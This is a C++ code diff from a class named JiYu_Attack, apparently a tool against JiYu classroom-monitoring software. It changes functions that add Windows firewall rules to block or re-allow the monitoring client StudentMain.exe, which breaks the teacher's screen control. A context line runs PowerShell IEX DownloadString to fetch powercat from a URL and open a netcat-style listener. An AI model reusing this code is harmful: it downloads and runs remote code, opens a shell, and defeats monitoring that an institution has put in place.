@@ -229,18 +229,27 @@ int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
         "powershell IEX (New-Object System.Net.Webclient).DownloadString('" + nc_ps_url +
         "');powercat -l -p " + std::to_string(ncport)
     ).c_str());
+    WaitForSingleObject(hThread, INFINITE);
     return 0;
 }
 
 int JiYu_Attack::breakScreenControl() {
-    execCmd("sc config MpsSvc start=auto", logger);
-    execCmd("net start MpsSvc", logger);
-    execCmd("netsh advfirewall set allprofiles state on", logger);
-    execCmd("netsh advfirewall firewall set rule name=\"StudentMain.exe\" new action=block", logger);
+    if(system("net session >nul 2>&1")) {
+        return 3;
+    }
+    system("sc config MpsSvc start=auto >nul 2>&1");
+    system("net start MpsSvc >nul 2>&1");
+    system("netsh advfirewall set allprofiles state on >nul 2>&1");
+    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
+    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=block >nul 2>&1");
     return 0;
 }
 
 int JiYu_Attack::continueScreenControl() {
-    execCmd("netsh advfirewall firewall set rule name=\"StudentMain.exe\" new action=allow", logger);
+    if(system("net session >nul 2>&1")) {
+        return 3;
+    }
+    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
+    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=allow >nul 2>&1");
     return 0;
 }
